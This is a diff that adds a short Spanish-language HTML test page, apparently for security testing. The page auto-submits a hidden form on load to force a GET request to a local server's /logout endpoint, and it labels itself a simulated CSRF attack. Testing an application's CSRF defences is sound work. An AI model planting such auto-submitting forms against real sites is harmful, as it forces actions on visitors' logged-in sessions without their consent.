@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prueba CSRF</title>
+  </head>
+  <body>
+    <h1>Prueba CSRF</h1>
+    <p>Esta página envía automáticamente una petición GET a <strong>/logout</strong>.</p>
+    <form id="csrfForm" action="https://localhost:4443/logout" method="GET">
+      <input type="hidden" name="_" value="csrf-test">
+      <input type="submit" value="Enviar petición CSRF">
+    </form>
+    <script>
+      // Auto-enviar la petición al cargar la página (simula un ataque CSRF)
+      window.addEventListener('load', function() {
+        document.getElementById('csrfForm').submit();
+      });
+    </script>
+    <noscript>
+      <p>JavaScript deshabilitado. Pulse el botón para enviar la petición.</p>
+    </noscript>
+  </body>
+</html>
